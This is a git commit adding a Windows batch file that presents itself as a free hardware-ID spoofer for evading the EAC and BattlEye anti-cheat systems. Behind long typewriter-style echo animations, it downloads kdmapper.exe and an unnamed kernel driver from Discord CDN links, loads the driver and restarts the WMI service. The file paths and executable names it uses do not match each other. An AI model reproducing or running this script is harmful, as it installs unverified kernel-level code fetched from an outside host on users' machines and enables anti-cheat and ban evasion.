8820d48bdde5eeffc299bcfd8bbcf190fa85f2f2
mobb094 <123269134+mobb094@users.noreply.github.com>
2023-01-22 11:55:37 +0100

    Add files via upload
    Batch made spoofer
    Please dont sell this
    
    UD all EAC / BE games (22.01.23)

---
+++ woof.bat
@@ -0,0 +1,464 @@
+
+:▒██   ██▒  ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
+:▒▒ █ █ ▒░▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
+:░░  █   ░░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
+: ░ █ █ ▒   ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
+:▒██▒ ▒██▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
+:▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
+:░░   ░▒ ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
+: ░    ░  ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
+: ░    ░        ░               ░ ░      ░ ░             ░  ░   ░     
+                                                                     
+
+:xspoofer is 100% free so dont sell it!
+:i used updated undetected drivers in it (if drivers got detected update yourself)
+:working in: Fortnite, Apex (Just all EAC and BE games)
+
+
+@echo off
+title xspoofer.com (https://github.com/mobb094/xspoofer)
+
+
+cls
+echo.
+echo x
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xs
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xsp
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspo
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoo
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoof
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofe
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer b
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by m
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mo
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mob
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb0
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb09
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo.
+ping localhost -n 4 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo m
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo ma
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo mad
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made i
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in b
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in bat
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batc
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+ping localhost -n 4 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo m
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my g
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my gi
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my git
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my gith
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my githu
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: 
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+ping localhost -n 4 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo S
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Sp
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spo
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoo
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (Y
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (Y/
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (Y/N
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (Y/N)
+ping localhost -n 1 >nul
+cls
+echo.
+echo xspoofer by mobb094
+echo made in batch
+echo my github: https://github.com/mobb094/xspoofer
+echo.
+echo Spoof (Y/N):
+set /p spoof=
+
+if %spoof%==Y goto spoof
+if %spoof%==y goto spoof
+if %spoof%==N goto quit
+if %spoof%==n goto quit
+
+:spoof
+cls
+echo.
+echo S
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Sp
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spo
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoo
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoof
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofi
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofin
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing H
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HW
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HWI
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HWID
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HWID.
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HWID..
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Spoofing HWID...
+echo.
+ping localhost -n 2 >nul
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/1057704829142695970/1064575623789559899/kdmapper.exe -Outfile kdmapper.exe"
+move "C:\Users\%username%\Desktop\kdmapper.exe" "C:\"
+move "C:\Users\%username%\Downloads\kdmapper.exe" "C:\"
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/1057704829142695970/1064575623370121246/driver.sys -Outfile driver.sys"
+move "C:\Users\%username%\Desktop\driver.sys" "C:\"
+move "C:\Users\%username%\Downloads\driver.sys" "C:\"
+cd C:\
+mapper.exe driver.sys
+del kdmapper.exe
+del driver.sys
+net stop winmgmt /y
+net start winmgmt /y
+sc stop winmgmt 
+sc start winmgmt
+exit
+
+
+
+
+
+
+
+
+
+
+
+:quit
+cls
+echo.
+echo Q
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Qu
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Qui
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quit
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quiti
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quitin
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quiting
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quiting.
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quiting..
+echo.
+ping localhost -n 1 >nul
+cls
+echo.
+echo Quiting...
+echo.
+ping localhost -n 4 >nul
+exit
